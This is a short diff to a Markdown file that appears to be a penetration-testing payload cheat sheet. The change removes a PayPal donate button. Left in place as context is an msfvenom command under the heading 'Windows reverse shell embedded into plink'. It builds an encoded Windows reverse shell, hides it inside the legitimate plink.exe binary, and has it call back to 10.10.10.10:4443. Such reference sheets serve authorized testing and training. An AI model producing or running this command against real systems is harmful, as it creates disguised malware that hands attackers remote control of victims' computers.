@@ -76,9 +76,3 @@ run
 
 ### Windows reverse shell embedded into plink  
 ```msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe```
-
----
-
-<a href="https://www.paypal.com/donate/?hosted_button_id=GWWLEXEF3XL92">
-  <img src="https://raw.githubusercontent.com/kraloveckey/kraloveckey/refs/heads/main/.assets/paypal-donate-button.png" alt="Donate with PayPal" width="225" height="100"/>
-</a>
